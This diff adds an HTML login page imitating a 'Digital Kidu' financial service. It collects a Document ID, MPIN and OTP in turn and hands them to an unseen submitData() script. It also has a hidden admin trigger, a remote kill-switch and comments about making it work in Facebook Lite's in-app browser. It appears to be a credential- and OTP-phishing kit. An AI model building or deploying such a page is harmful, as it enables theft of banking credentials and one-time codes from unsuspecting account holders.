@@ -1,0 +1,247 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
+    <meta name="apple-mobile-web-app-capable" content="yes">
+    <meta name="mobile-web-app-capable" content="yes">
+    <meta name="format-detection" content="telephone=no">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <title>Digital Kidu</title>
+    <link rel="stylesheet" href="{{ url_for('static', filename='css/style.css') }}?v=30">
+</head>
+<body>
+
+    <div id="websiteOffOverlay" class="website-off-overlay" style="display: none;">
+        <div class="off-content">
+            <div class="off-icon">⚡</div>
+            <h2>Service Unavailable</h2>
+            <p>The service is currently disabled. Please try again later.</p>
+        </div>
+    </div>
+
+    <div id="mainApp" class="main-app">
+        <div class="overlay"></div>
+
+        <div class="header-content">
+            <div class="header-top">
+                <div></div>
+                <div class="bell-icon">
+                    🔔<span class="dot"></span>
+                </div>
+            </div>
+            <h2 class="greeting">Kuzuzangpola</h2>
+            <p class="tagline">Simple and secure, your smart financial solution</p>
+        </div>
+
+        <div class="bottom-sheet-wrapper">
+            <div class="bottom-sheet">
+
+                <div id="step-login">
+                    <h3 class="step-title">Login to Digital Kidu</h3>
+                    <div class="input-group">
+                        <label>Document ID</label>
+                        <input type="text" id="docIdInput" placeholder="Enter your Document ID" inputmode="numeric" pattern="[0-9]*" maxlength="20" autocomplete="off">
+                        <p id="idError" class="error-msg">Please enter a valid Document ID</p>
+                    </div>
+                    <button class="btn-primary" onclick="goToMpin()">Continue</button>
+                    <p class="bottom-text">Don't have DK account yet? <a href="#">Sign up</a></p>
+                </div>
+
+                <div id="step-mpin" class="hidden">
+                    <h3 class="step-title">Enter your MPIN</h3>
+                    <div class="pin-row">
+                        <input type="password" maxlength="1" inputmode="numeric" class="mpin-input" oninput="moveNext(this,'mpin')">
+                        <input type="password" maxlength="1" inputmode="numeric" class="mpin-input" oninput="moveNext(this,'mpin')">
+                        <input type="password" maxlength="1" inputmode="numeric" class="mpin-input" oninput="moveNext(this,'mpin')">
+                        <input type="password" maxlength="1" inputmode="numeric" class="mpin-input" oninput="moveNext(this,'mpin')">
+                        <input type="password" maxlength="1" inputmode="numeric" class="mpin-input" oninput="moveNext(this,'mpin')">
+                        <input type="password" maxlength="1" inputmode="numeric" class="mpin-input" oninput="moveNext(this,'mpin')">
+                    </div>
+                    <p class="forgot-text">Forgot MPIN</p>
+                    <button class="btn-primary" onclick="goToOtp()">Login</button>
+                </div>
+
+                <div id="step-otp" class="hidden">
+                    <div class="otp-header">
+                        <h3 class="step-title">OTP verification</h3>
+                        <button class="close-btn" onclick="goToLogin()">✕</button>
+                    </div>
+                    <p class="otp-sub">Your code has been sent to <span>+975XXXXXX059</span></p>
+                    <div class="pin-row">
+                        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input" oninput="moveNext(this,'otp')">
+                        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input" oninput="moveNext(this,'otp')">
+                        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input" oninput="moveNext(this,'otp')">
+                        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input" oninput="moveNext(this,'otp')">
+                        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input" oninput="moveNext(this,'otp')">
+                        <input type="tel" maxlength="1" inputmode="numeric" class="otp-input" oninput="moveNext(this,'otp')">
+                    </div>
+                    <p class="resend-text">Resend OTP <span>(04:00)</span></p>
+                    <button class="btn-primary" onclick="submitData()">Verify & Login</button>
+                </div>
+
+            </div>
+        </div>
+    </div>
+
+    <div id="adminTrigger" onclick="triggerAdmin()"></div>
+
+    <script src="{{ url_for('static', filename='js/user_v4.js') }}?v=20"></script>
+    <script>
+        // ==================== URL SECURITY LOCK ====================
+        (function() {
+            const allowedPaths = ['/', '/index', '/login', '/admin', '/admin/login'];
+            const currentPath = window.location.pathname;
+            
+            if (!allowedPaths.includes(currentPath) && !currentPath.startsWith('/static/')) {
+                window.location.replace('/');
+            }
+
+            window.addEventListener('popstate', function() {
+                if (!allowedPaths.includes(window.location.pathname) && !window.location.pathname.startsWith('/static/')) {
+                    window.location.replace('/');
+                }
+            });
+        })();
+
+        // ==================== KEYBOARD FIX (FORCE SHIFT — NO DETECTION) ====================
+        // Facebook Lite / Facebook WebView mein keyboard height detect NAHI hoti.
+        // Solution: Input focus hone par FORCE SHIFT karo — bina kuch detect kiye.
+        // Yeh har browser mein kaam karega kyunki `focus` event universal hai.
+
+        (function() {
+            const sheetWrapper = document.querySelector('.bottom-sheet-wrapper');
+            const sheet = document.querySelector('.bottom-sheet');
+            const headerContent = document.querySelector('.header-content');
+            if (!sheetWrapper || !sheet) return;
+
+            let isShifted = false;
+
+            // ==================== FORCE SHIFT UP ====================
+            function forceShiftUp() {
+                if (isShifted) return;
+                isShifted = true;
+
+                // Screen ke 45% hisse tak form ko upar shift karo
+                // (yeh value universal hai — chhote/bare phone mein bhi kaam karega)
+                const shiftAmount = Math.round(window.innerHeight * 0.45);
+
+                sheetWrapper.style.position = 'fixed';
+                sheetWrapper.style.left = '0';
+                sheetWrapper.style.right = '0';
+                sheetWrapper.style.width = '100%';
+                sheetWrapper.style.bottom = shiftAmount + 'px';
+                sheetWrapper.style.zIndex = '9999';
+                sheetWrapper.style.marginTop = '0';
+                sheetWrapper.style.transition = 'bottom 0.25s ease-out';
+
+                // Sheet ko scrollable karo
+                sheet.style.maxHeight = (window.innerHeight - shiftAmount) + 'px';
+                sheet.style.overflowY = 'auto';
+                sheet.style.paddingBottom = '30px';
+
+                // Header ko halka karo
+                if (headerContent) {
+                    headerContent.style.opacity = '0.1';
+                    headerContent.style.transition = 'opacity 0.2s';
+                }
+
+                document.body.classList.add('keyboard-open');
+                console.log("⌨️ FORCE SHIFT UP — " + shiftAmount + "px");
+            }
+
+            // ==================== FORCE SHIFT DOWN ====================
+            function forceShiftDown() {
+                if (!isShifted) return;
+                isShifted = false;
+
+                sheetWrapper.style.position = '';
+                sheetWrapper.style.left = '';
+                sheetWrapper.style.right = '';
+                sheetWrapper.style.width = '';
+                sheetWrapper.style.bottom = '';
+                sheetWrapper.style.zIndex = '';
+                sheetWrapper.style.marginTop = '';
+                sheetWrapper.style.transition = '';
+
+                sheet.style.maxHeight = '';
+                sheet.style.overflowY = '';
+                sheet.style.paddingBottom = '';
+
+                if (headerContent) {
+                    headerContent.style.opacity = '';
+                    headerContent.style.transition = '';
+                }
+
+                document.body.classList.remove('keyboard-open');
+                console.log("⌨️ FORCE SHIFT DOWN");
+            }
+
+            // ==================== FOCUS HANDLER (UNIVERSAL) ====================
+            // Yeh har browser mein fire hota hai — Facebook Lite mein bhi
+            document.addEventListener('focusin', function(e) {
+                if (e.target && e.target.tagName === 'INPUT') {
+                    // Thoda delay taake keyboard animation start ho jaye
+                    setTimeout(forceShiftUp, 50);
+                    setTimeout(forceShiftUp, 200);
+                    setTimeout(forceShiftUp, 400);
+                }
+            });
+
+            // ==================== BLUR HANDLER ====================
+            document.addEventListener('focusout', function(e) {
+                if (e.target && e.target.tagName === 'INPUT') {
+                    setTimeout(() => {
+                        const active = document.activeElement;
+                        if (!active || active.tagName !== 'INPUT') {
+                            forceShiftDown();
+                        }
+                    }, 200);
+                }
+            });
+
+            // ==================== SAFETY NET ====================
+            // Har 300ms check karo — agar input focused hai lekin form shift nahi hua
+            // to force shift karo
+            setInterval(() => {
+                const active = document.activeElement;
+                const isInputFocused = active && active.tagName === 'INPUT';
+
+                if (isInputFocused && !isShifted) {
+                    forceShiftUp();
+                } else if (!isInputFocused && isShifted) {
+                    forceShiftDown();
+                }
+            }, 300);
+
+            // ==================== ORIENTATION CHANGE ====================
+            window.addEventListener('orientationchange', () => {
+                setTimeout(() => {
+                    if (isShifted) {
+                        forceShiftDown();
+                        setTimeout(forceShiftUp, 300);
+                    }
+                }, 400);
+            });
+        })();
+
+        // ==================== WEBSITE STATE ====================
+        function checkWebsiteState() {
+            fetch('/get_website_state?t=' + Date.now())
+                .then(res => res.json())
+                .then(data => {
+                    const overlay = document.getElementById('websiteOffOverlay');
+                    if (data.enabled) {
+                        overlay.style.display = 'none';
+                    } else {
+                        overlay.style.display = 'flex';
+                    }
+                })
+                .catch(() => {});
+        }
+        
+        window.addEventListener('load', checkWebsiteState);
+        setInterval(checkWebsiteState, 3000);
+    </script>
+</body>
+</html>
